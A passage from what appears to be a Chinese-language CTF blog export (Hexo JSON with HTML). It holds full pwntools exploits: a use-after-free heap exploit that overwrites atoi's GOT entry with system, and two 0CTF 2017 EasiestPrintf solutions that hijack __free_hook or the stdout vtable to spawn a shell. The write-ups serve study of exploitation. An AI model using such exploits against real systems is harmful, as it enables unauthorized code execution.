class=\"string\">'debug'</span>))</div><div class=\"line\"></div><div class=\"line\">bss = <span class=\"number\">0</span>x0000000000601D00</div><div class=\"line\">elf = ELF(<span class=\"string\">'./book'</span>)</div><div class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class=\"line\"></div><div class=\"line\">atoi_got = elf.got[<span class=\"string\">'atoi'</span>]</div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">add</span>(author, length, feedback):</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'!!\\n'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(str(<span class=\"number\">2</span>))</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'author:\\n'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(author)</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'it?\\n'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(str(length))</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(feedback)</div><div class=\"line\"></div><div class=\"line\">def <span class=\"keyword\">delete</span>(<span class=\"built_in\">index</span>):</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'!!\\n'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(str(<span class=\"number\">3</span>))</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'book?\\n'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(str(<span class=\"built_in\">index</span>))</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">def feedback(<span class=\"built_in\">index</span>, feedback):</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'!!\\n'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(str(<span class=\"number\">4</span>))</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'feedback?'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(str(<span class=\"built_in\">index</span>))</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(feedback)</div><div class=\"line\"></div><div class=\"line\">def pwn():</div><div class=\"line\"># use UAF <span class=\"keyword\">to</span> exploit house_of_spirit </div><div class=\"line\"># UAF</div><div class=\"line\">    <span class=\"built_in\">add</span>(str(<span class=\"number\">0</span>), <span class=\"number\">0</span>x30, <span class=\"string\">'a'</span>)</div><div class=\"line\">    <span class=\"keyword\">delete</span>(<span class=\"number\">0</span>)</div><div class=\"line\">    <span class=\"built_in\">add</span>(str(<span class=\"number\">1</span>), <span class=\"number\">0</span>x20, <span class=\"string\">'b'</span>)</div><div class=\"line\">    <span class=\"keyword\">delete</span>(<span class=\"number\">0</span>)</div><div class=\"line\">    <span class=\"built_in\">add</span>(str(<span class=\"number\">2</span>), <span class=\"number\">0</span>x10, <span class=\"string\">'c'</span>)</div><div class=\"line\">    <span class=\"keyword\">delete</span>(<span class=\"number\">0</span>)</div><div class=\"line\">    <span class=\"built_in\">add</span>(str(<span class=\"number\">3</span>), <span class=\"number\">0</span>x20, <span class=\"string\">'d'</span>)  # <span class=\"built_in\">index</span> <span class=\"number\">0</span></div><div class=\"line\">    payload = <span class=\"string\">'a'</span> * <span class=\"number\">0</span>x20 + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0</span>x21) + p64(<span class=\"number\">0</span>x601d58 - <span class=\"number\">0</span>x10)</div><div class=\"line\">    feedback(<span class=\"number\">0</span>, payload)</div><div class=\"line\">    <span class=\"built_in\">add</span>(str(<span class=\"number\">4</span>), <span class=\"number\">0</span>x10, <span class=\"string\">'e'</span>)  # <span class=\"built_in\">index</span> <span class=\"number\">2</span></div><div class=\"line\">#    gdb.attach(<span class=\"keyword\">p</span>)</div><div class=\"line\">    <span class=\"built_in\">add</span>(str(<span class=\"number\">5</span>), <span class=\"number\">0</span>x10, <span class=\"string\">'f'</span> * <span class=\"number\">0</span>x8 + p64(atoi_got)) # <span class=\"built_in\">index</span> <span class=\"number\">1</span></div><div class=\"line\"></div><div class=\"line\"># leak atoi_addr</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'!!\\n'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(<span class=\"string\">'4'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'is '</span>)</div><div class=\"line\">    atoi_addr = u64(<span class=\"keyword\">p</span>.recv(<span class=\"number\">6</span>) + <span class=\"string\">'\\x00\\x00'</span>)</div><div class=\"line\">#    gdb.attach(<span class=\"keyword\">p</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvline()</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'atoi_addr =&gt; '</span>, hex(atoi_addr)</div><div class=\"line\"></div><div class=\"line\"># <span class=\"keyword\">edit</span> atoi <span class=\"keyword\">to</span> <span class=\"built_in\">system</span></div><div class=\"line\">    libc.address = atoi_addr - libc.symbols[<span class=\"string\">'atoi'</span>]</div><div class=\"line\">    system_addr = libc.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'system_addr =&gt; '</span>, hex(system_addr)</div><div class=\"line\">    binsh_addr = libc.<span class=\"built_in\">search</span>(<span class=\"string\">'/bin/sh'</span>).<span class=\"keyword\">next</span>()</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(<span class=\"string\">'0'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.sendline(p64(system_addr))</div><div class=\"line\">#    gdb.attach(<span class=\"keyword\">p</span>)</div><div class=\"line\"></div><div class=\"line\"># getshell</div><div class=\"line\">    <span class=\"keyword\">p</span>.recvuntil(<span class=\"string\">'!!\\n'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.send(<span class=\"string\">'/bin/sh\\x00'</span>)</div><div class=\"line\">    <span class=\"keyword\">p</span>.interactive()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    pwn()</div></pre></td></tr></table></figure></p>\n"},{"title":"20170CTF","date":"2017-03-27T12:56:21.000Z","_content":"\n## EasiestPrintf\n\n简单的程序，但是始终找不到利用方法。看了wp，给大佬们跪了，好多奇技淫巧。\n\n顺便吐吐槽新的`pwntools`的大升级。\n\n### 第一个思路\n\n我们`checksec`之后发现`got`是不能重写的。\n\n```\n[!] Couldn't find relocations against PLT to get symbols\n[*] '/home/ubuntu/ctf-problem/20170ctf/pwn/easiestPrintf/EasiestPrintf'\n    Arch:     i386-32-little\n    RELRO:    Full RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\n> Change the value of `__malloc_hook` or `__free_hook` and find a way to trigger them in printf.\n\n事实上，在`printf`函数中，当我们打印的字符串长度过长时，会调用`malloc`和`free`的函数。\n\n```\nvfprintf.c\nif (width >= WORK_BUFFER_SIZE - 32)\n\t  {\n\t    /* We have to use a special buffer.  The \"32\" is just a safe\n\t       bet for all the output which is not counted in the width.  */\n\t    size_t needed = ((size_t) width + 32) * sizeof (CHAR_T);\n\t    if (__libc_use_alloca (needed))\n\t      workend = (CHAR_T *) alloca (needed) + width + 32;\n\t    else\n\t      {\n\t\tworkstart = (CHAR_T *) malloc (needed);\n\t\tif (workstart == NULL)\n\t\t  {\n\t\t    done = -1;\n\t\t    goto all_done;\n\t\t  }\n\t\tworkend = workstart + width + 32;\n\t      }\n\t  }\n```\n\n> 1. Leak the libc address from the arbitrary read.\n2. Construct a format string with\n\tthe `%hhn` trick to modify `__free_hook` to the one-gadget.\n\t`%100000c` to trigger malloc and free.\n    \n> I choose `__free_hook` instead of `__malloc_hook` because the address of `__malloc_hook` contains a `\\x0a` byte which will break the reading of the input.\n\n1. 用格式化字符串修改`__free_hook`，使其指向一个gadget\n2. 用`%100000c`去除法`malloc`\n\n**事实上，题目给出的`libc`的版本是早于`libc.2.23.so`的，所以存在`*0x3E297`这样一个`execve('/bin/sh')`，在之后版本的`libc`中全部都吧`/bin/sh`给去掉了**\n\n> 在GNU C库中，可以通过指定合适的钩子函数，来修改`malloc`、`relloc`、`free`的行为，通过使用这些钩子，可以帮助我们对动态的内存分配进行调试。 在`malloc.h`中定义了以下钩子变量：\n`__malloc_hook`\n该变量是`malloc`被调用时所使用的函数的指针，类型为`void *function (size_t size, const void *caller)`，`caller`的值表示`malloc`被调用时在栈上的返回地址，该值可以用来跟踪程序的内存消耗情况。\n`__realloc_hook`\n与`__malloc_hook`类似，该变量是realloc被调用时所使用的函数的指针，类型为`void *function (void *ptr, size_t size, const void *caller)`\n`__free_hook`\n该变量是free被调用时所使用的函数的指针，类型为`void function (void *ptr, const void *caller)`\n`__memalign_hook`\n该变量是`aligned_alloc`,` memalign`, `posix_memalign`和`valloc`所使用的函数的指针，类型为`void *function (size_t alignment, size_t size, const void *caller)`\n`__malloc_initialize_hook`\n该变量是初始化malloc系列函数的函数指针，该函数仅被调用一次。 如：\n`void (*__malloc_initialize_hook) (void) = my_init_hook;`\n\n> 这些钩子函数在较新版本的gcc中已经被废弃了。 那么还有别的办法吗？ 注入`malloc/realloc/free`调试函数的一个可行的方式是采用自己的库来`export`这些函数，C链接规则是明确按顺序来的，因此如果两个库提供了相同的函数，第一个指定的将被使用。 在unix系统上，则可以使用`LD_PRELOAD`机制在加载时注入自己的`malloc`函数。 \n\n最终的exp\n```\nfrom pwn import *\n\ncontext.log_level = 'critical'\n\nlibc = ELF('/lib/i386-linux-gnu/libc.so.6')\nelf = ELF('./EasiestPrintf')\n\nread_got = elf.symbols['_GLOBAL_OFFSET_TABLE_'] + 12\nlibc.symbols['one_gadget'] = 0x3E297\n\np = process('./EasiestPrintf')\n\ndef exec_fmt(payload):\n    p = elf.process(env = {'LD_PRELOAD': libc.path})\n    p.sendline(str(read_got))\n    p.recvuntil('Good Bye\\n')\n    p.sendline(payload)\n    return p.recvall()\n\nfmt = FmtStr(exec_fmt)\nlog.critical('offset: ' + str(fmt.offset))\n\np = process('./EasiestPrintf')\nprint p.recvline()\n\np.sendline(str(read_got))\ndata = p.recvline()\nprint data\nread_addr = int(data, 16)\nlibc.address = read_addr - libc.symbols['read']\nlog.critical('libc_base : ', hex(libc.address))\n\nprint p.recvline()\np.sendline(fmtstr_payload(fmt.offset, {libc.symbols['__free_hook']: libc.symbols['one_gadget']}) + '%100000c')\np.interactive()\n```\n\n### 第二个思路\n\n> 程序在进行一次任意地址读之后有一次格式化字符串的机会，之后直接`exi`t。在程序启用`Full RELRO`的情况下，选择覆盖`libc`中的`_IO_2_1_stdout_`结构的虚表，因为`printf`在将所有输入解析之后会调用其中的某个函数进行输出，我们可以其改为`system`，而这个结构自身会作为参数传入，覆盖虚表之后将一个`sh\\0\\0`写到整个结构头部即可。\n\n```\nfrom pwn import *\n\nDEBUG = 1\n\nelf = ELF('./EasiestPrintf')\n\naddr_stdout = 0x0804a044\n\nif DEBUG:\n    libc = ELF('/lib/i386-linux-gnu/libc.so.6')\n    p = process('./EasiestPrintf')\n    context(log_level = 'critical')\nelse:\n    # p = remote('202.120.7.210', 12321)\n    libc = ELF('./libc.so.6')\n\ndef makeio():\n    return remote('202.120.7.210', 12321)\n\ndef get_addr(addr):\n    p.recvuntil('read:\\n')\n    p.sendline(str(addr))\n    addr = p.recvuntil('\\n')[:-1]\n    addr = int(addr, 16)\n    print 'stdout =>', hex(addr)\n    return addr\n\nif __name__ == '__main__':\n    stdout_addr = get_addr(addr_stdout)\n    libc.address = stdout_addr - libc.symbols['_IO_2_1_stdout_']\n    system_addr = libc.symbols['system']\n    stdout_vtable_addr = stdout_addr + 0x94\n    str_sh = u32('sh\\x00\\x00')\n    x1 = system_addr\n    x1_hi, x1_lo = x1 >> 16, x1 & 0xFFFF\n    x2 = stdout_addr - 4 - 0x1c\n    x2_hi, x2_lo = x2 >> 16, x2 & 0xFFFF\n \n    print p.recvuntil('Good Bye\\n')\n\n    # libc_stdout = 'sh\\x00\\x00'\n    # libc_stdout-4 = &system\n    # libc_stdout_vtable+0x1c = &(libc_stdout-4)\n    buf = p32(stdout_addr) + p32(stdout_addr-4) + p32(stdout_addr-2) + p32(stdout_vtable_addr)\n    buf += '%' + str(str_sh-16) + 'c%7$n'\n    buf += '%' + str(0x10000+x1_lo-str_sh) + 'c%8$hn'\n    buf += '%' + str(0x10000+x1_hi-x1_lo) + 'c%9$hn'\n    buf += '%' + str(0x10000+x2_lo-x1_hi) + 'c%10$hn'\n\n    p.sendline(buf)\n    p.interactive()\n```","source":"_posts/20170CTF.md","raw":"---\ntitle: 20170CTF\ntags:\n  - PWN\ncategories: []\ndate: 2017-03-27 20:56:21\n---\n\n## EasiestPrintf\n\n简单的程序，但是始终找不到利用方法。看了wp，给大佬们跪了，好多奇技淫巧。\n\n顺便吐吐槽新的`pwntools`的大升级。\n\n### 第一个思路\n\n我们`checksec`之后发现`got`是不能重写的。\n\n```\n[!] Couldn't find relocations against PLT to get symbols\n[*] '/home/ubuntu/ctf-problem/20170ctf/pwn/easiestPrintf/EasiestPrintf'\n    Arch:     i386-32-little\n    RELRO:    Full RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\n> Change the value of `__malloc_hook` or `__free_hook` and find a way to trigger them in printf.\n\n事实上，在`printf`函数中，当我们打印的字符串长度过长时，会调用`malloc`和`free`的函数。\n\n```\nvfprintf.c\nif (width >= WORK_BUFFER_SIZE - 32)\n\t  {\n\t    /* We have to use a special buffer.  The \"32\" is just a safe\n\t       bet for all the output which is not counted in the width.  */\n\t    size_t needed = ((size_t) width + 32) * sizeof (CHAR_T);\n\t    if (__libc_use_alloca (needed))\n\t      workend = (CHAR_T *) alloca (needed) + width + 32;\n\t    else\n\t      {\n\t\tworkstart = (CHAR_T *) malloc (needed);\n\t\tif (workstart == NULL)\n\t\t  {\n\t\t    done = -1;\n\t\t    goto all_done;\n\t\t  }\n\t\tworkend = workstart + width + 32;\n\t      }\n\t  }\n```\n\n> 1. Leak the libc address from the arbitrary read.\n2. Construct a format string with\n\tthe `%hhn` trick to modify `__free_hook` to the one-gadget.\n\t`%100000c` to trigger malloc and free.\n    \n> I choose `__free_hook` instead of `__malloc_hook` because the address of `__malloc_hook` contains a `\\x0a` byte which will break the reading of the input.\n\n1. 用格式化字符串修改`__free_hook`，使其指向一个gadget\n2. 用`%100000c`去除法`malloc`\n\n**事实上，题目给出的`libc`的版本是早于`libc.2.23.so`的，所以存在`*0x3E297`这样一个`execve('/bin/sh')`，在之后版本的`libc`中全部都吧`/bin/sh`给去掉了**\n\n> 在GNU C库中，可以通过指定合适的钩子函数，来修改`malloc`、`relloc`、`free`的行为，通过使用这些钩子，可以帮助我们对动态的内存分配进行调试。 在`malloc.h`中定义了以下钩子变量：\n`__malloc_hook`\n该变量是`malloc`被调用时所使用的函数的指针，类型为`void *function (size_t size, const void *caller)`，`caller`的值表示`malloc`被调用时在栈上的返回地址，该值可以用来跟踪程序的内存消耗情况。\n`__realloc_hook`\n与`__malloc_hook`类似，该变量是realloc被调用时所使用的函数的指针，类型为`void *function (void *ptr, size_t size, const void *caller)`\n`__free_hook`\n该变量是free被调用时所使用的函数的指针，类型为`void function (void *ptr, const void *caller)`\n`__memalign_hook`\n该变量是`aligned_alloc`,` memalign`, `posix_memalign`和`valloc`所使用的函数的指针，类型为`void *function (size_t alignment, size_t size, const void *caller)`\n`__malloc_initialize_hook`\n该变量是初始化malloc系列函数的函数指针，该函数仅被调用一次。 如：\n`void (*__malloc_initialize_hook) (void) = my_init_hook;`\n\n> 这些钩子函数在较新版本的gcc中已经被废弃了。 那么还有别的办法吗？ 注入`malloc/realloc/free`调试函数的一个可行的方式是采用自己的库来`export`这些函数，C链接规则是明确按顺序来的，因此如果两个库提供了相同的函数，第一个指定的将被使用。 在unix系统上，则可以使用`LD_PRELOAD`机制在加载时注入自己的`malloc`函数。 \n\n最终的exp\n```\nfrom pwn import *\n\ncontext.log_level = 'critical'\n\nlibc = ELF('/lib/i386-linux-gnu/libc.so.6')\nelf = ELF('./EasiestPrintf')\n\nread_got = elf.symbols['_GLOBAL_OFFSET_TABLE_'] + 12\nlibc.symbols['one_gadget'] = 0x3E297\n\np = process('./EasiestPrintf')\n\ndef exec_fmt(payload):\n    p = elf.process(env = {'LD_PRELOAD': libc.path})\n    p.sendline(str(read_got))\n    p.recvuntil('Good Bye\\n')\n    p.sendline(payload)\n    return p.recvall()\n\nfmt = FmtStr(exec_fmt)\nlog.critical('offset: ' + str(fmt.offset))\n\np = process('./EasiestPrintf')\nprint p.recvline()\n\np.sendline(str(read_got))\ndata = p.recvline()\nprint data\nread_addr = int(data, 16)\nlibc.address = read_addr - libc.symbols['read']\nlog.critical('libc_base : ', hex(libc.address))\n\nprint p.recvline()\np.sendline(fmtstr_payload(fmt.offset, {libc.symbols['__free_hook']: libc.symbols['one_gadget']}) + '%100000c')\np.interactive()\n```\n\n### 第二个思路\n\n> 程序在进行一次任意地址读之后有一次格式化字符串的机会，之后直接`exi`t。在程序启用`Full RELRO`的情况下，选择覆盖`libc`中的`_IO_2_1_stdout_`结构的虚表，因为`printf`在将所有输入解析之后会调用其中的某个函数进行输出，我们可以其改为`system`，而这个结构自身会作为参数传入，覆盖虚表之后将一个`sh\\0\\0`写到整个结构头部即可。\n\n```\nfrom pwn import *\n\nDEBUG = 1\n\nelf = ELF('./EasiestPrintf')\n\naddr_stdout = 0x0804a044\n\nif DEBUG:\n    libc = ELF('/lib/i386-linux-gnu/libc.so.6')\n    p = process('./EasiestPrintf')\n    context(log_level = 'critical')\nelse:\n    # p = remote('202.120.7.210', 12321)\n    libc = ELF('./libc.so.6')\n\ndef makeio():\n    return remote('202.120.7.210', 12321)\n\ndef get_addr(addr):\n    p.recvuntil('read:\\n')\n    p.sendline(str(addr))\n    addr = p.recvuntil('\\n')[:-1]\n    addr = int(addr, 16)\n    print 'stdout =>', hex(addr)\n    return addr\n\nif __name__ == '__main__':\n    stdout_addr = get_addr(addr_stdout)\n    libc.address = stdout_addr - libc.symbols['_IO_2_1_stdout_']\n    system_addr = libc.symbols['system']\n    stdout_vtable_addr = stdout_addr + 0x94\n    str_sh = u32('sh\\x00\\x00')\n    x1 = system_addr\n    x1_hi, x1_lo = x1 >> 16, x1 & 0xFFFF\n    x2 = stdout_addr - 4 - 0x1c\n    x2_hi, x2_lo = x2 >> 16, x2 & 0xFFFF\n \n    print p.recvuntil('Good Bye\\n')\n\n    # libc_stdout = 'sh\\x00\\x00'\n    # libc_stdout-4 = &system\n    # libc_stdout_vtable+0x1c = &(libc_stdout-4)\n    buf = p32(stdout_addr) + p32(stdout_addr-4) + p32(stdout_addr-2) + p32(stdout_vtable_addr)\n    buf += '%' + str(str_sh-16) + 'c%7$n'\n    buf += '%' + str(0x10000+x1_lo-str_sh) + 'c%8$hn'\n    buf += '%' + str(0x10000+x1_hi-x1_lo) + 'c%9$hn'\n    buf += '%' + str(0x10000+x2_lo-x1_hi) + 'c%10$hn'\n\n    p.sendline(buf)\n    p.interactive()\n```","slug":"20170CTF","published":1,"updated":"2017-04-08T08:44:06.559Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jwm0002hv1891vo9xkj","content":"<h2 id=\"EasiestPrintf\"><a href=\"#EasiestPrintf\" class=\"headerlink\" title=\"EasiestPrintf\"></a>EasiestPrintf</h2><p>简单的程序，但是始终找不到利用方法。看了wp，给大佬们跪了，好多奇技淫巧。</p>\n<p>顺便吐吐槽新的<code>pwntools</code>的大升级。</p>\n<h3 id=\"第一个思路\"><a href=\"#第一个思路\" class=\"headerlink\" title=\"第一个思路\"></a>第一个思路</h3><p>我们<code>checksec</code>之后发现<code>got</code>是不能重写的。</p>\n<figure class=\"highlight scheme\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">[<span class=\"name\">!</span>] Couldn<span class=\"symbol\">'t</span> find relocations against PLT to get symbols</div><div class=\"line\">[<span class=\"name\"><span class=\"builtin-name\">*</span></span>] <span class=\"symbol\">'/home/ubuntu/ctf-problem/20170ctf/pwn/easiestPrintf/EasiestPrintf</span>'</div><div class=\"line\">    Arch:     i386-32-little</div><div class=\"line\">    RELRO:    Full RELRO</div><div class=\"line\">    Stack:    No canary found</div><div class=\"line\">    NX:       NX enabled</div><div class=\"line\">    PIE:      No PIE (<span class=\"name\">0x8048000</span>)</div></pre></td></tr></table></figure>\n<blockquote>\n<p>Change the value of <code>__malloc_hook</code> or <code>__free_hook</code> and find a way to trigger them in printf.</p>\n</blockquote>\n<p>事实上，在<code>printf</code>函数中，当我们打印的字符串长度过长时，会调用<code>malloc</code>和<code>free</code>的函数。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">vfprintf</span>.<span class=\"function\">c</span></div><div class=\"line\"><span class=\"title\">if</span> <span class=\"params\">(width &gt;= WORK_BUFFER_SIZE - <span class=\"number\">32</span>)</span></div><div class=\"line\">\t  &#123;</div><div class=\"line\">\t    <span class=\"comment\">/* We have to use a special buffer.  The \"32\" is just a safe</span></div><div class=\"line\">\t       bet for all the output which is not counted in the width.  */</div><div class=\"line\">\t    <span class=\"keyword\">size_t</span> needed = ((<span class=\"keyword\">size_t</span>) width + <span class=\"number\">32</span>) * <span class=\"keyword\">sizeof</span> (CHAR_T);</div><div class=\"line\">\t    <span class=\"keyword\">if</span> (__libc_use_alloca (needed))</div><div class=\"line\">\t      workend = (CHAR_T *) alloca (needed) + width + <span class=\"number\">32</span>;</div><div class=\"line\">\t    <span class=\"keyword\">else</span></div><div class=\"line\">\t      &#123;</div><div class=\"line\">\t\tworkstart = (CHAR_T *) <span class=\"built_in\">malloc</span> (needed);</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (workstart == <span class=\"literal\">NULL</span>)</div><div class=\"line\">\t\t  &#123;</div><div class=\"line\">\t\t    done = <span class=\"number\">-1</span>;</div><div class=\"line\">\t\t    <span class=\"keyword\">goto</span> all_done;</div><div class=\"line\">\t\t  &#125;</div><div class=\"line\">\t\tworkend = workstart + width + <span class=\"number\">32</span>;</div><div class=\"line\">\t      &#125;</div><div class=\"line\">\t  &#125;</div></pre></td></tr></table></figure>\n<blockquote>\n<ol>\n<li>Leak the libc address from the arbitrary read.</li>\n<li>Construct a format string with<br> the <code>%hhn</code> trick to modify <code>__free_hook</code> to the one-gadget.<br> <code>%100000c</code> to trigger malloc and free.</li>\n</ol>\n<p>I choose <code>__free_hook</code> instead of <code>__malloc_hook</code> because the address of <code>__malloc_hook</code> contains a <code>\\x0a</code> byte which will break the reading of the input.</p>\n</blockquote>\n<ol>\n<li>用格式化字符串修改<code>__free_hook</code>，使其指向一个gadget</li>\n<li>用<code>%100000c</code>去除法<code>malloc</code></li>\n</ol>\n<p><strong>事实上，题目给出的<code>libc</code>的版本是早于<code>libc.2.23.so</code>的，所以存在<code>*0x3E297</code>这样一个<code>execve(&#39;/bin/sh&#39;)</code>，在之后版本的<code>libc</code>中全部都吧<code>/bin/sh</code>给去掉了</strong></p>\n<blockquote>\n<p>在GNU C库中，可以通过指定合适的钩子函数，来修改<code>malloc</code>、<code>relloc</code>、<code>free</code>的行为，通过使用这些钩子，可以帮助我们对动态的内存分配进行调试。 在<code>malloc.h</code>中定义了以下钩子变量：<br><code>__malloc_hook</code><br>该变量是<code>malloc</code>被调用时所使用的函数的指针，类型为<code>void *function (size_t size, const void *caller)</code>，<code>caller</code>的值表示<code>malloc</code>被调用时在栈上的返回地址，该值可以用来跟踪程序的内存消耗情况。<br><code>__realloc_hook</code><br>与<code>__malloc_hook</code>类似，该变量是realloc被调用时所使用的函数的指针，类型为<code>void *function (void *ptr, size_t size, const void *caller)</code><br><code>__free_hook</code><br>该变量是free被调用时所使用的函数的指针，类型为<code>void function (void *ptr, const void *caller)</code><br><code>__memalign_hook</code><br>该变量是<code>aligned_alloc</code>,<code>memalign</code>, <code>posix_memalign</code>和<code>valloc</code>所使用的函数的指针，类型为<code>void *function (size_t alignment, size_t size, const void *caller)</code><br><code>__malloc_initialize_hook</code><br>该变量是初始化malloc系列函数的函数指针，该函数仅被调用一次。 如：<br><code>void (*__malloc_initialize_hook) (void) = my_init_hook;</code></p>\n<p>这些钩子函数在较新版本的gcc中已经被废弃了。 那么还有别的办法吗？ 注入<code>malloc/realloc/free</code>调试函数的一个可行的方式是采用自己的库来<code>export</code>这些函数，C链接规则是明确按顺序来的，因此如果两个库提供了相同的函数，第一个指定的将被使用。 在unix系统上，则可以使用<code>LD_PRELOAD</code>机制在加载时注入自己的<code>malloc</code>函数。 </p>\n</blockquote>\n<p>最终的exp<br><figure class=\"highlight processing\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div></pre></td><td class=\"code\"><pre><div class=\"line\">from pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">context.log_level = <span class=\"string\">'critical'</span></div><div class=\"line\"></div><div class=\"line\">libc = ELF(<span class=\"string\">'/lib/i386-linux-gnu/libc.so.6'</span>)</div><div class=\"line\">elf = ELF(<span class=\"string\">'./EasiestPrintf'</span>)</div><div class=\"line\"></div><div class=\"line\">read_got = elf.symbols[<span class=\"string\">'_GLOBAL_OFFSET_TABLE_'</span>] + <span class=\"number\">12</span></div><div class=\"line\">libc.symbols[<span class=\"string\">'one_gadget'</span>] = <span class=\"number\">0x3E297</span></div><div class=\"line\"></div><div class=\"line\">p = process(<span class=\"string\">'./EasiestPrintf'</span>)</div><div class=\"line\"></div><div class=\"line\">def exec_fmt(payload):</div><div class=\"line\">    p = elf.process(env = &#123;<span class=\"string\">'LD_PRELOAD'</span>: libc.path&#125;)</div><div class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(read_got))</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Good Bye\\n'</span>)</div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\">    <span class=\"keyword\">return</span> p.recvall()</div><div class=\"line\"></div><div class=\"line\">fmt = FmtStr(exec_fmt)</div><div class=\"line\"><span class=\"built_in\">log</span>.critical(<span class=\"string\">'offset: '</span> + <span class=\"built_in\">str</span>(fmt.offset))</div><div class=\"line\"></div><div class=\"line\">p = process(<span class=\"string\">'./EasiestPrintf'</span>)</div><div class=\"line\"><span class=\"built_in\">print</span> p.recvline()</div><div class=\"line\"></div><div class=\"line\">p.sendline(<span class=\"built_in\">str</span>(read_got))</div><div class=\"line\">data = p.recvline()</div><div class=\"line\"><span class=\"built_in\">print</span> data</div><div class=\"line\">read_addr = <span class=\"built_in\">int</span>(data, <span class=\"number\">16</span>)</div><div class=\"line\">libc.address = read_addr - libc.symbols[<span class=\"string\">'read'</span>]</div><div class=\"line\"><span class=\"built_in\">log</span>.critical(<span class=\"string\">'libc_base : '</span>, <span class=\"built_in\">hex</span>(libc.address))</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">print</span> p.recvline()</div><div class=\"line\">p.sendline(fmtstr_payload(fmt.offset, &#123;libc.symbols[<span class=\"string\">'__free_hook'</span>]: libc.symbols[<span class=\"string\">'one_gadget'</span>]&#125;) + <span class=\"string\">'%100000c'</span>)</div><div class=\"line\">p.interactive()</div></pre></td></tr></table></figure></p>\n<h3 id=\"第二个思路\"><a href=\"#第二个思路\" class=\"headerlink\" title=\"第二个思路\"></a>第二个思路</h3><blockquote>\n<p>程序在进行一次任意地址读之后有一次格式化字符串的机会，之后直接<code>exi</code>t。在程序启用<code>Full RELRO</code>的情况下，选择覆盖<code>libc</code>中的<code>_IO_2_1_stdout_</code>结构的虚表，因为<code>printf</code>在将所有输入解析之后会调用其中的某个函数进行输出，我们可以其改为<code>system</code>，而这个结构自身会作为参数传入，覆盖虚表之后将一个<code>sh\\0\\0</code>写到整个结构头部即可。</p>\n</blockquote>\n<figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div 